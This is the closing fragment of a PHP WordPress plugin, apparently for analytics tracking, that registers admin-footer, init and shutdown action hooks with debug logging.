if (vga_get_option('track_adm_pages')) {
  vga_debug('Adding admin_footer action hook for tracker');
  add_action('admin_footer', 'vga_adm_footer_track');
}
vga_debug('Adding init action hook');
add_action('init', 'vga_init');
vga_debug('Adding shutdown action hook for debugging and notice if wp_footer is hooked');
add_action('shutdown', 'vga_shutdown');

?>